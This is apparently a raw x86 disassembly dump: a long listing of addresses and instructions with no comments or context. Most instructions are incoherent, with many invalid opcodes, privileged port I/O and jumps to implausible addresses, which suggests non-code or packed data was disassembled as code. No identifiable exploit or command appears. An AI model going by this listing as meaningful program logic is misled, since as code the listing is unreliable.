  41a3c4:	ss pop ebp
  41a3c6:	retf   0x4be0
  41a3c9:	mov    esp,0x7af83f42
  41a3ce:	or     edx,edi
  41a3d0:	mov    DWORD PTR [edi-0x5c973394],0x81e387f2
  41a3da:	jge    0x41a3c7
  41a3dc:	sub    bl,0x4c
  41a3df:	nop
  41a3e0:	call   0x3757:0x4f332274
  41a3e7:	mov    edi,eax
  41a3e9:	mov    ds:0x670803cb,eax
  41a3ee:	call   0xcc82:0x77344f49
  41a3f5:	lods   al,BYTE PTR ds:[esi]
  41a3f6:	imul   esp,DWORD PTR [ecx-0x590b9c5f],0x63
  41a3fd:	fwait
  41a3fe:	mov    ds:0xdaa2eb8a,eax
  41a403:	dec    edx
  41a404:	in     al,0xec
  41a406:	out    0x28,eax
  41a408:	inc    edx
  41a409:	mov    bl,ch
  41a40b:	arpl   WORD PTR [edx+0x54fa945b],si
  41a411:	nop
  41a412:	cwde   
  41a413:	xor    al,0xdc
  41a415:	sbb    DWORD PTR ds:0x2bb1de98,ebx
  41a41b:	inc    esi
  41a41c:	addr16 pop edx
  41a41e:	cmp    cl,BYTE PTR [eax+0x3059fb93]
  41a424:	adc    eax,DWORD PTR [edi+0x56]
  41a427:	gs push edx
  41a429:	imul   edx,ebp,0x6d44aa6a
  41a42f:	push   esp
  41a430:	xchg   esi,eax
  41a431:	push   ss
  41a432:	xor    al,0xf0
  41a434:	jb     0x41a3d3
  41a436:	imul   esp,esi,0x17f4762c
  41a43c:	cmp    dh,BYTE PTR [ebp-0x37]
  41a43f:	wrmsr  
  41a441:	lock or BYTE PTR [eax],0x75
  41a445:	adc    al,0xc7
  41a447:	data16 sahf 
  41a449:	fidiv  WORD PTR [edi]
  41a44b:	dec    edi
  41a44c:	scas   eax,DWORD PTR es:[edi]
  41a44d:	mov    al,ds:0x49c07b89
  41a452:	xchg   edi,eax
  41a453:	cmp    ch,bh
  41a455:	jo     0x41a455
  41a457:	out    0xff,al
  41a459:	xor    al,BYTE PTR ss:[ebx+0x15]
  41a45d:	test   DWORD PTR [esi],esp
  41a45f:	mov    eax,0x52203d0b
  41a464:	pop    eax
  41a465:	push   0xfc85a6d9
  41a46a:	mov    BYTE PTR [ebx],cl
  41a46c:	jecxz  0x41a474
  41a46e:	(bad)  
  41a46f:	and    ebp,DWORD PTR [ecx]
  41a471:	fbstp  TBYTE PTR [esi+edi*4]
  41a474:	xchg   edi,eax
  41a475:	in     al,0x40
  41a477:	jbe    0x41a4f7
  41a479:	push   ecx
  41a47a:	jmp    0x9115e3f9
  41a47f:	inc    esp
  41a480:	inc    ebp
  41a481:	dec    edi
  41a482:	ins    DWORD PTR es:[edi],dx
  41a483:	xor    al,0x1c
  41a485:	fstp   TBYTE PTR [ebp-0x74]
  41a488:	inc    ecx
  41a489:	test   DWORD PTR ds:0xe4833c5a,ebp
  41a48f:	sub    eax,0x1
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	stc    
  41a501:	mov    ah,0xc3
  41a503:	mov    al,ds:0x11730
  41a508:	add    eax,0x1
  41a50d:	mov    ecx,0x1ebb6814
  41a512:	sub    WORD PTR [ebp+0x7957b4cc],0x3ae
  41a51b:	stc    
  41a51c:	cmp    al,0xb
  41a51e:	dec    esi
  41a51f:	mov    ebx,0xf5d41511
  41a524:	mov    ecx,0x33d563df
  41a529:	xchg   edx,eax
  41a52a:	jae    0x41a575
  41a52c:	(bad)  
  41a52d:	in     eax,0x84
  41a52f:	adc    eax,0x6bab8c61
  41a534:	popa   
  41a535:	xor    dl,ch
  41a537:	mul    DWORD PTR [ecx]
  41a539:	pusha  
  41a53a:	and    BYTE PTR [eax+0x72],dh
  41a53d:	inc    edi
  41a53e:	inc    edi
  41a53f:	icebp  
  41a540:	mov    ecx,0x16a44169
  41a545:	mov    bl,0x28
  41a547:	fwait
  41a548:	bound  ebx,QWORD PTR [edi+0x3f67dd98]
  41a54e:	xor    BYTE PTR [esi],cl
  41a550:	idiv   DWORD PTR [edi-0x7a]
  41a553:	jmp    0x18c8:0x88424bec
  41a55a:	mul    DWORD PTR [esi-0x6820f281]
  41a560:	lock pushf 
  41a562:	sar    ebx,cl
  41a564:	push   ebp
  41a565:	mov    dh,0x93
  41a567:	push   edi
  41a568:	sbb    edi,eax
  41a56a:	fsub   QWORD PTR [esi]
  41a56c:	mov    ch,0x35
  41a56e:	adc    bl,cl
  41a570:	call   0x7f129bb4
  41a575:	out    0xdf,al
  41a577:	jp     0x41a5a6
  41a579:	ret    0x79a
  41a57c:	sti    
  41a57d:	imul   ebx,DWORD PTR [edx],0x1d912973
  41a583:	mov    ch,0xf6
  41a585:	aaa    
  41a586:	call   0x375c:0xb6a7f10c
  41a58d:	daa    
  41a58e:	out    0xf0,eax
  41a590:	or     eax,0x375bae65
  41a595:	retf   0xf464
  41a598:	sub    eax,0xd5de12b
  41a59d:	scas   al,BYTE PTR es:[edi]
  41a59e:	fisttp QWORD PTR [ecx+ebx*4+0x7c2e3a7c]
  41a5a5:	mov    bl,0x47
  41a5a7:	test   DWORD PTR [ecx+esi*1],edx
  41a5aa:	dec    eax
  41a5ab:	xor    BYTE PTR ds:0x5dcb71a8,0xaa
  41a5b2:	ins    BYTE PTR es:[edi],dx
  41a5b3:	push   cs
  41a5b4:	stos   BYTE PTR es:[edi],al
  41a5b5:	mov    al,ds:0xfb6a8542
  41a5ba:	loopne 0x41a603
  41a5bc:	cs aad 0x48
  41a5bf:	jbe    0x41a5fb
  41a5c1:	inc    ebx
  41a5c2:	scas   al,BYTE PTR es:[edi]
  41a5c3:	imul   esi,eax,0xffffffd8
  41a5c6:	dec    ebp
  41a5c7:	cmp    cl,BYTE PTR [eax]
  41a5c9:	lea    esi,[edi]
  41a5cb:	cmp    al,0x5b
  41a5cd:	push   ds
  41a5ce:	(bad)  
  41a5cf:	mov    cl,0xa5
  41a5d1:	lods   eax,DWORD PTR ds:[esi]
  41a5d2:	arpl   WORD PTR [ebp-0x44],bx
  41a5d5:	fdiv   QWORD PTR [edi]
  41a5d8:	stc    
  41a5d9:	cwde   
  41a5da:	(bad)  
  41a5db:	and    edx,DWORD PTR [ecx+0x6b]
  41a5de:	daa    
  41a5df:	jmp    0x41a657
  41a5e1:	cmp    al,0x64
  41a5e3:	call   0xc8afbe7c
  41a5e8:	popf   
  41a5e9:	inc    edi
  41a5ea:	add    BYTE PTR ds:0x767042af,dh
  41a5f0:	or     dh,BYTE PTR [ecx-0xb]
  41a5f3:	adc    ah,BYTE PTR [eax-0x47ba081a]
  41a5f9:	sub    DWORD PTR [ebp+0x1],esp
  41a5fc:	xchg   esp,edi
  41a5fe:	iret   
  41a5ff:	adc    BYTE PTR [edi+edi*4-0x17e5d743],0x6e
  41a607:	add    DWORD PTR [eax-0x23],edi
  41a60a:	push   ds
  41a60b:	test   BYTE PTR [edx-0x32],dl
  41a60e:	mov    al,ds:0x792c
	...
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x79bfa625
  41a682:	std    
  41a683:	xor    eax,0x11835
  41a688:	add    eax,0x42000001
  41a68d:	(bad)  
  41a68e:	jg     0x41a686
  41a690:	add    BYTE PTR [ecx],0xa8
  41a693:	xchg   ebp,eax
  41a694:	popf   
  41a695:	sbb    cl,BYTE PTR [eax+ebx*2]
  41a698:	daa    
  41a699:	sar    DWORD PTR [edx+0x4c49ff2b],0x5c
  41a6a0:	pop    ss
  41a6a1:	mov    BYTE PTR [edx+0x44],dh
  41a6a4:	loope  0x41a6d3
  41a6a6:	scas   ax,WORD PTR es:[edi]
  41a6a8:	or     cl,BYTE PTR [edi+ebp*4-0x35]
  41a6ac:	call   0xbd14cfa
  41a6b1:	and    esi,DWORD PTR ds:0x4d12df33
  41a6b7:	jmp    0x80a49bb3
  41a6bc:	loop   0x41a6a5
  41a6be:	imul   ebp,DWORD PTR [ebx+edx*4-0x2e],0xffffff8b
  41a6c3:	jle    0x41a706
  41a6c5:	jmp    0x41a6e5
  41a6c7:	pop    esi
  41a6c8:	add    bl,dh
  41a6ca:	inc    edx
  41a6cb:	jle    0x41a660
  41a6cd:	inc    edi
  41a6ce:	inc    ebp
  41a6cf:	jbe    0x41a699
  41a6d1:	(bad)  
  41a6d2:	aam    0x29
  41a6d4:	(bad)  
  41a6d5:	xor    al,0x7c
  41a6d7:	pushf  
  41a6d8:	xor    edx,DWORD PTR [esi]
  41a6da:	xor    BYTE PTR [ebx-0xc2d81fa],0x28
  41a6e1:	loop   0x41a755
  41a6e3:	mov    bh,0x92
  41a6e5:	and    ah,cl
  41a6e7:	and    eax,0xb8d143c4
  41a6ec:	dec    ebx
  41a6ed:	cmp    DWORD PTR [edx+0x18a7de01],ebp
  41a6f3:	popf   
  41a6f4:	add    ebx,esi
  41a6f6:	push   ebp
  41a6f7:	scas   eax,DWORD PTR es:[edi]
  41a6f8:	stc    
  41a6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6fa:	and    BYTE PTR [esi+0x32],0x95
  41a6fe:	adc    BYTE PTR [edi+0xc],cl
  41a701:	fnsave [ecx-0x7c]
  41a704:	xchg   esi,esi
  41a706:	mov    ah,0x64
  41a708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a709:	inc    esp
  41a70a:	fild   QWORD PTR [edi+0x43]
  41a70d:	sar    cl,0x99
  41a710:	dec    ecx
  41a711:	dec    edx
  41a712:	(bad)  [ebx+ebx*4]
  41a715:	stc    
  41a716:	daa    
  41a717:	mov    edi,0x3dc586d2
  41a71c:	shr    BYTE PTR [ebp+edx*8+0x6e],1
  41a720:	push   ebx
  41a721:	jae    0x41a6c6
  41a723:	and    eax,ecx
  41a725:	jbe    0x41a72c
  41a727:	repz retf 0xfa9e
  41a72b:	idiv   BYTE PTR [edx-0x213bd091]
  41a731:	ret    0x7e96
  41a734:	xlat   BYTE PTR ds:[ebx]
  41a735:	mov    edx,0x7b350dd5
  41a73a:	call   0xe95afad2
  41a73f:	sub    BYTE PTR [ecx-0x5df06fa3],0x74
  41a746:	fldcw  WORD PTR [eax]
  41a748:	sub    ecx,ebp
  41a74a:	jmp    ebp
  41a74c:	and    BYTE PTR [edx-0x47481e12],dh
  41a752:	out    dx,al
  41a753:	cwde   
  41a754:	pop    edi
  41a755:	xlat   BYTE PTR ds:[ebx]
  41a756:	push   0x37
  41a758:	aam    0x3
  41a75a:	xor    al,0x8d
  41a75c:	mov    al,0xd4
  41a75e:	int    0xba
  41a760:	or     eax,0x2377139b
  41a765:	adc    BYTE PTR [ecx],dl
  41a767:	call   0xbe65:0x235e449f
  41a76e:	shl    DWORD PTR [ecx-0x340e7b7b],0x14
  41a775:	mov    al,0x4e
  41a777:	into   
  41a778:	dec    esi
  41a779:	rcl    cl,cl
  41a77b:	inc    ebx
  41a77c:	out    dx,eax
  41a77d:	(bad)  
  41a77f:	(bad)  [edi-0x27]
  41a782:	jo     0x41a751
  41a784:	ror    BYTE PTR [ebx],1
  41a786:	mov    eax,ds:0xab3a49a8
  41a78b:	(bad)  
  41a78c:	nop
  41a78d:	out    dx,eax
  41a78e:	cdq    
  41a78f:	mov    esi,0x2
	...
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x445327ca,al
  41a801:	mov    eax,ds:0x193a84be
  41a806:	add    DWORD PTR [eax],eax
  41a808:	add    eax,0x77000001
  41a80d:	rep stos BYTE PTR es:[edi],al
  41a80f:	test   al,0x11
  41a811:	dec    edx
  41a812:	ss clc 
  41a814:	lods   al,BYTE PTR ds:[esi]
  41a815:	dec    esi
  41a816:	pop    ecx
  41a817:	mov    cl,0x91
  41a819:	jmp    0x4aa1:0x47a946a3
  41a820:	sub    BYTE PTR [esi],0xd7
  41a823:	ds cld 
  41a825:	and    ebx,DWORD PTR [eax+esi*8]
  41a828:	jne    0x41a869
  41a82a:	dec    esi
  41a82b:	or     cl,BYTE PTR [esi-0x3f89636b]
  41a831:	xchg   edx,eax
  41a832:	sar    BYTE PTR [edx-0x7a],cl
  41a835:	mov    ah,0xc8
  41a837:	mov    ebx,0x58ea12bc
  41a83c:	cmc    
  41a83d:	popa   
  41a83e:	ficom  DWORD PTR es:[eax-0x2d4657ed]
  41a845:	inc    esp
  41a846:	out    0x1a,al
  41a848:	aam    0x97
  41a84a:	or     ecx,DWORD PTR [eax+eax*2+0x53ff1f2c]
  41a851:	mov    eax,ds:0xf4d24478
  41a856:	sbb    DWORD PTR [di+0x54],edi
  41a85a:	test   DWORD PTR ds:0xdf4a05e5,edi
  41a860:	mov    ds:0xc2bfa8aa,eax
  41a865:	(bad)  
  41a866:	pop    ebp
  41a867:	mov    WORD PTR [ecx],?
  41a869:	inc    ecx
  41a86a:	sub    DWORD PTR [ebx],0x4e4a6177
  41a870:	mov    al,0x74
  41a872:	or     esp,eax
  41a874:	sbb    eax,0x7bc8f331
  41a879:	retf   0x7c4
  41a87c:	adc    DWORD PTR [ebp-0x75de7a87],ebx
  41a882:	or     ecx,ebx
  41a884:	xor    al,0x90
  41a886:	push   esp
  41a887:	popf   
  41a888:	dec    eax
  41a889:	inc    esi
  41a88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a88b:	stos   DWORD PTR es:[edi],eax
  41a88c:	idiv   edx
  41a88e:	pushf  
  41a88f:	rcr    ebx,1
  41a891:	jb     0x41a8d9
  41a893:	push   ss
  41a894:	dec    edx
  41a895:	xor    eax,0x3652b7bd
  41a89a:	(bad)  
  41a89b:	cli    
  41a89c:	push   edi
  41a89d:	add    BYTE PTR ds:0x30e63213,ch
  41a8a3:	sbb    al,0xef
  41a8a5:	inc    edi
  41a8a6:	dec    ecx
  41a8a7:	jne    0x41a8a0
  41a8a9:	or     DWORD PTR [ebx+0x71905344],edi
  41a8af:	cld    
  41a8b0:	sbb    ch,BYTE PTR [ebx-0x50ab8fd8]
  41a8b6:	call   DWORD PTR [ebp+0x71db9b0d]
  41a8bc:	test   al,0x1
  41a8be:	icebp  
  41a8bf:	push   ebp
  41a8c0:	sbb    eax,0x4fb79e72
  41a8c5:	(bad)  
  41a8c6:	shr    DWORD PTR [ebp*4-0x6c059ee7],cl
  41a8cd:	lods   al,BYTE PTR ds:[esi]
  41a8ce:	dec    edx
  41a8cf:	imul   ecx,ebx,0x16
  41a8d2:	loopne 0x41a8e6
  41a8d4:	xor    al,0x50
  41a8d6:	test   eax,0x71fdf937
  41a8db:	sahf   
  41a8dc:	xchg   esi,eax
  41a8dd:	jne    0x41a8a7
  41a8df:	jle    0x41a94b
  41a8e1:	and    al,0x6f
  41a8e3:	adc    al,0xa
  41a8e5:	xchg   DWORD PTR [eax-0x1700249b],ebx
  41a8eb:	cli    
  41a8ec:	xchg   ecx,eax
  41a8ed:	mov    ch,dh
  41a8ef:	sbb    DWORD PTR [edx+0x1b],ebp
  41a8f2:	pop    ebx
  41a8f3:	jmp    0x684beb89
  41a8f8:	arpl   cx,bx
  41a8fa:	xchg   ecx,eax
  41a8fb:	push   ebx
  41a8fc:	int3   
  41a8fd:	mov    cl,0x63
  41a8ff:	stos   BYTE PTR es:[edi],al
  41a900:	jne    0x41a8e5
  41a902:	pop    eax
  41a903:	adc    DWORD PTR [ebp+0x4e],edi
  41a906:	cs rol bl,1
  41a909:	cmc    
  41a90a:	mov    DWORD PTR [esi+0x4a],eax
  41a90d:	xchg   esi,eax
  41a90e:	and    edi,DWORD PTR [esi+0xed]
	...
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	add    BYTE PTR [eax+0x1a3f1d06],ah
  41a986:	add    DWORD PTR [eax],eax
  41a988:	add    eax,0xfa000001
  41a98d:	mov    al,0x30
  41a98f:	mov    eax,ds:0xafa4a78c
  41a994:	in     eax,dx
  41a995:	push   edx
  41a996:	push   0x4442a826
  41a99b:	add    eax,0xb86ff300
  41a9a0:	adc    ecx,DWORD PTR [eax+eax*8-0x78]
  41a9a4:	scas   al,BYTE PTR es:[edi]
  41a9a5:	mov    ah,0x79
  41a9a7:	inc    eax
  41a9a8:	sbb    eax,0x6c98a27d
  41a9ad:	and    eax,0xe5469719
  41a9b2:	sub    bl,BYTE PTR [edx]
  41a9b4:	hlt    
  41a9b5:	adc    ebp,ecx
  41a9b7:	imul   edi,ebp,0xffffff89
  41a9ba:	mov    BYTE PTR [esi-0x4f],bh
  41a9bd:	sbb    eax,DWORD PTR [ebp-0x4dd58da3]
  41a9c3:	push   cs
  41a9c4:	mov    ecx,0xc28b77ff
  41a9c9:	jl     0x41a9c0
  41a9cb:	adc    bh,BYTE PTR [edx-0x34]
  41a9ce:	jecxz  0x41a9fa
  41a9d0:	neg    BYTE PTR [esi]
  41a9d2:	xor    esp,DWORD PTR [eax]
  41a9d4:	jp     0x41a9b2
  41a9d6:	les    edx,FWORD PTR [edi]
  41a9d8:	sub    ch,bl
  41a9da:	mov    bh,BYTE PTR [edi+0x4e]
  41a9dd:	pop    eax
  41a9de:	mov    bl,0x45
  41a9e0:	jb     0x41a9d3
  41a9e2:	loop   0x41a981
  41a9e4:	(bad)  
  41a9e5:	mov    ch,0x2e
  41a9e7:	sbb    eax,ecx
  41a9e9:	mov    edx,0xa2e74a96
  41a9ee:	jno    0x41a9a9
  41a9f0:	fcomp  DWORD PTR [esi-0x68e6d7d6]
  41a9f6:	pop    ebp
  41a9f7:	push   0xffffffec
  41a9f9:	shr    ah,1
  41a9fb:	mov    ebp,0x723f8c08
  41aa00:	cld    
  41aa01:	and    ebp,esi
  41aa03:	fidivr DWORD PTR [ebx+0x72120ae2]
  41aa09:	stos   BYTE PTR es:[edi],al
  41aa0a:	and    ebx,edx
  41aa0c:	sar    BYTE PTR [esi+0x792515e1],cl
  41aa12:	(bad)  
  41aa13:	pushf  
  41aa14:	call   0x1972:0x5f280e5e
  41aa1b:	aad    0xa8
  41aa1d:	ret    
  41aa1e:	ds icebp 
  41aa20:	and    cl,BYTE PTR [edx+0x46]
  41aa23:	sub    al,0xe5
  41aa25:	loop   0x41a9ca
  41aa27:	and    dh,ch
  41aa29:	inc    ebx
  41aa2a:	(bad)  
  41aa2b:	imul   ecx,DWORD PTR [ebx+0x10bcbefa],0xcf28f575
  41aa35:	sub    DWORD PTR [esi+0x3b768def],ebx
  41aa3b:	jnp    0x41aa5a
  41aa3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa3e:	xor    edx,DWORD PTR [ebp-0x40efc9df]
  41aa44:	and    bl,ch
  41aa46:	pop    edx
  41aa47:	mov    ds:0xd48f6737,eax
  41aa4c:	jg     0x41aaac
  41aa4e:	and    al,BYTE PTR [edx]
  41aa50:	imul   ebx,edx,0x7472666c
  41aa56:	adc    BYTE PTR [edx],bh
  41aa58:	sar    BYTE PTR [esi-0x79fa1949],1
  41aa5e:	je     0x41aa57
  41aa60:	scas   al,BYTE PTR es:[edi]
  41aa61:	jbe    0x41aa17
  41aa63:	adc    DWORD PTR [ecx],ebp
  41aa65:	sub    BYTE PTR [edx-0x3e6742],ah
  41aa6b:	jne    0x41aa0c
  41aa6d:	xchg   DWORD PTR [ecx],esi
  41aa6f:	es popa 
  41aa71:	jno    0x41aad7
  41aa73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa74:	inc    ecx
  41aa75:	test   BYTE PTR [ebx],0xdc
  41aa78:	jle    0x41aa45
  41aa7a:	inc    edi
  41aa7b:	iret   
  41aa7c:	jb     0x41aaf1
  41aa7e:	xchg   edx,eax
  41aa7f:	repnz mov ds:0x989a6aac,eax
  41aa85:	and    bl,al
  41aa87:	addr16 mov edi,0x4567cd36
  41aa8d:	sti    
  41aa8e:	inc    edx
  41aa8f:	out    0x26,eax
	...
  41aaf1:	add    BYTE PTR [eax],al
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	and    al,0x72
  41ab02:	fnstsw WORD PTR [esi+0x11b44]
  41ab08:	add    eax,0xa0000001
  41ab0d:	sub    ecx,edx
  41ab0f:	push   ebx
  41ab10:	fidiv  DWORD PTR [ebx+0x2c242c05]
  41ab16:	and    eax,0xfac41874
  41ab1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab1c:	stos   BYTE PTR es:[edi],al
  41ab1d:	test   eax,0x51ca241d
  41ab22:	cwde   
  41ab23:	mov    DWORD PTR [eax+0x46],0xacb018a8
  41ab2a:	sar    DWORD PTR [esi+0x75ed7597],1
  41ab30:	loop   0x41ab25
  41ab32:	fst    QWORD PTR [edi*2-0xbfad33a]
  41ab39:	(bad)  
  41ab3a:	in     eax,dx
  41ab3b:	ret    
  41ab3c:	call   0x73a0:0x71fd7a99
  41ab43:	outs   dx,BYTE PTR ds:[esi]
  41ab44:	push   ss
  41ab45:	mov    ah,BYTE PTR [eax+0x22]
  41ab48:	mov    ds:0x4b813e18,al
  41ab4d:	xor    al,0xc0
  41ab4f:	mov    edi,0x829e77ff
  41ab54:	jg     0x41ab8a
  41ab56:	gs out 0x77,al
  41ab59:	aaa    
  41ab5a:	or     BYTE PTR [ecx-0x730425d7],ah
  41ab60:	das    
  41ab61:	jg     0x41ab1b
  41ab63:	xchg   ebx,eax
  41ab64:	push   esi
  41ab65:	hlt    
  41ab66:	push   eax
  41ab67:	out    dx,al
  41ab68:	push   esi
  41ab69:	shl    DWORD PTR [ebx],0x6f
  41ab6c:	call   0x93f9:0x3eb12ed1
  41ab73:	pop    esp
  41ab74:	outs   dx,BYTE PTR ds:[esi]
  41ab75:	sub    dl,ch
  41ab77:	fidiv  DWORD PTR [ecx-0x8a0db53]
  41ab7d:	dec    esi
  41ab7e:	mov    ds:0x9613b253,al
  41ab83:	inc    ebp
  41ab84:	fwait
  41ab85:	inc    ecx
  41ab86:	stos   BYTE PTR es:[edi],al
  41ab87:	out    0xfa,al
  41ab89:	lds    esp,FWORD PTR [esp+edx*2-0x13238fd8]
  41ab90:	call   0xf5497a08
  41ab95:	(bad)  
  41ab96:	call   0x25a6e12d
  41ab9b:	xor    esi,edx
  41ab9d:	xchg   BYTE PTR [ebx+0x17530d15],cl
  41aba3:	adc    eax,0xd28f9377
  41aba8:	mov    ebp,0x90338c27
  41abad:	mov    edi,0x580e8ee6
  41abb2:	inc    edx
  41abb3:	aaa    
  41abb4:	xor    dl,BYTE PTR [edx+0x4af59104]
  41abba:	dec    ebp
  41abbb:	ret    
  41abbc:	leave  
  41abbd:	sub    edi,esi
  41abbf:	push   0x652b3375
  41abc4:	inc    esp
  41abc5:	sbb    BYTE PTR [ecx-0x3be84b24],0x7a
  41abcc:	scas   al,BYTE PTR es:[edi]
  41abcd:	(bad)  
  41abce:	sbb    BYTE PTR [edi+0x10],ah
  41abd1:	add    BYTE PTR [bp+si],0x71
  41abd5:	jecxz  0x41ac20
  41abd7:	pop    si
  41abd9:	sub    edx,0x8b36c740
  41abdf:	ins    BYTE PTR es:[edi],dx
  41abe0:	inc    ebx
  41abe1:	cmc    
  41abe2:	aas    
  41abe3:	mul    DWORD PTR [edi-0x5a]
  41abe6:	enter  0xb0d1,0x1e
  41abea:	mov    ss,ebx
  41abec:	ja     0x41ac3a
  41abee:	sub    DWORD PTR ds:0xadbb1595,eax
  41abf4:	int3   
  41abf5:	sahf   
  41abf6:	pop    ebp
  41abf7:	jns    0x41ac31
  41abf9:	aaa    
  41abfa:	fst    QWORD PTR [ebx]
  41abfc:	dec    eax
  41abfd:	push   esi
  41abfe:	out    dx,eax
  41abff:	fsub   DWORD PTR [edi-0x63397f6f]
  41ac05:	pop    esi
  41ac06:	mov    bl,0x69
  41ac08:	outs   dx,BYTE PTR ds:[esi]
  41ac09:	or     BYTE PTR [eax],dl
  41ac0b:	sub    al,0x56
  41ac0d:	(bad)  
  41ac0e:	leave  
  41ac0f:	jmp    0x41accd
	...
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esp+edx*4+0x77]
  41ac82:	mov    fs,WORD PTR [esi+0x49]
  41ac85:	sbb    al,0x1
  41ac87:	add    BYTE PTR ds:0x18000001,al
  41ac8d:	scas   al,BYTE PTR es:[edi]
  41ac8e:	or     al,0xc3
  41ac90:	imul   edx,DWORD PTR [ecx+ebx*2-0x6f],0x13f45ac7
  41ac98:	aas    
  41ac99:	and    al,BYTE PTR [edx-0x2d7f88d7]
  41ac9f:	add    al,0x7b
  41aca1:	jo     0x41aca9
  41aca3:	inc    esp
  41aca4:	sub    eax,0x717b39de
  41aca9:	pop    eax
  41acaa:	fcom   DWORD PTR [edx-0x59c145dc]
  41acb0:	mov    ds:0x4c161271,al
  41acb5:	push   esi
  41acb6:	mov    al,ds:0xdf762e69
  41acbb:	cmp    esi,edx
  41acbd:	imul   edi,DWORD PTR [edx],0x1269cc67
  41acc3:	test   DWORD PTR [ecx],0xa7a4fc5
  41acc9:	lea    ecx,[ebp+0x21]
  41accc:	mov    ds:0x110f69df,al
  41acd1:	test   BYTE PTR [edi+0x6b0d626d],0x8d
  41acd8:	mov    edx,0xc2b0c961
  41acdd:	(bad)  
  41acde:	call   0xec0d667f
  41ace3:	inc    ecx
  41ace4:	push   ds
  41ace5:	data16 mov al,0x5e
  41ace8:	int3   
  41ace9:	dec    eax
  41acea:	and    eax,0x4a202fef
  41acef:	mov    ebx,0xe4a5faf8
  41acf4:	nop
  41acf5:	lahf   
  41acf6:	fimul  DWORD PTR [eax+edx*1-0x3c]
  41acfa:	mov    bl,BYTE PTR [edi+0x52]
  41acfd:	adc    ah,BYTE PTR [eax+edi*8-0x4e]
  41ad01:	dec    esp
  41ad02:	cdq    
  41ad03:	inc    edi
  41ad04:	push   ss
  41ad05:	out    dx,al
  41ad06:	sub    al,0xe1
  41ad08:	cmp    eax,DWORD PTR [ecx]
  41ad0a:	mov    ch,0x59
  41ad0c:	inc    ecx
  41ad0d:	xor    al,0x5d
  41ad0f:	push   eax
  41ad10:	and    bl,BYTE PTR [ebp-0x78c18d97]
  41ad16:	lds    ecx,FWORD PTR [ebx+ecx*2+0x4]
  41ad1a:	xchg   edi,eax
  41ad1b:	xor    bh,0xf3
  41ad1e:	mov    fs,WORD PTR [ebp+0x58]
  41ad21:	sub    ah,BYTE PTR [esi-0x2dac2ec0]
  41ad27:	cmp    BYTE PTR [ebx+ebp*1+0x5f],bl
  41ad2b:	inc    edx
  41ad2c:	xchg   ebp,eax
  41ad2d:	das    
  41ad2e:	jo     0x41ad18
  41ad30:	fmul   DWORD PTR [edx+ebp*2-0x110ed957]
  41ad37:	test   DWORD PTR [esi],esi
  41ad39:	loop   0x41acd8
  41ad3b:	mov    ds:0x61fee1fc,eax
  41ad40:	mov    al,0xa7
  41ad42:	mov    ah,0x3c
  41ad44:	mov    ch,ah
  41ad46:	aaa    
  41ad47:	imul   esp,DWORD PTR [ebx-0x34],0x4dfdfafc
  41ad4e:	xor    BYTE PTR [ecx-0x5ae10f56],0xda
  41ad55:	loopne 0x41ada6
  41ad57:	push   esp
  41ad58:	dec    ecx
  41ad59:	retf   
  41ad5a:	nop
  41ad5b:	xchg   BYTE PTR [ebp+eiz*8+0x3def7e00],cl
  41ad62:	add    BYTE PTR [esi+0x19],bl
  41ad65:	sub    DWORD PTR [eax],edx
  41ad67:	xor    esp,DWORD PTR [ebp-0x561da322]
  41ad6d:	ss into 
  41ad6f:	push   0x63
  41ad71:	cmp    al,BYTE PTR [edx]
  41ad73:	or     edi,DWORD PTR [edx-0x3401fd8c]
  41ad79:	addr16 mov ah,0x55
  41ad7c:	aaa    
  41ad7d:	adc    al,0x76
  41ad7f:	xor    ah,BYTE PTR ds:0xe3f37e03
  41ad85:	mov    edx,0x163f8496
  41ad8a:	int    0xf4
  41ad8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad8e:	sbb    bl,BYTE PTR [esi+0x26]
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [esi+esi*4+0x4ef984d9],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	nop
  41ae0d:	aas    
  41ae0e:	(bad)  
  41ae0f:	pusha  
  41ae10:	dec    ebp
  41ae11:	jbe    0x41ae62
  41ae13:	dec    ebp
  41ae14:	xor    DWORD PTR [edx+eax*2],ecx
  41ae17:	push   ecx
  41ae18:	out    dx,al
  41ae19:	push   0xffffffb2
  41ae1b:	xchg   esp,eax
  41ae1c:	dec    esi
  41ae1d:	mov    eax,ds:0x7077ffc7
  41ae22:	ret    0xec3f
  41ae25:	and    BYTE PTR es:[esi],dh
  41ae28:	add    DWORD PTR ds:0xe5d9e7be,edi
  41ae2e:	test   BYTE PTR [edx],0xf4
  41ae31:	mov    edx,DWORD PTR [edx]
  41ae33:	lock mov ebp,0x7fe1bfbb
  41ae39:	lock push ebx
  41ae3b:	or     dl,BYTE PTR [esi+0xe]
  41ae3e:	je     0x52d765ae
  41ae44:	inc    eax
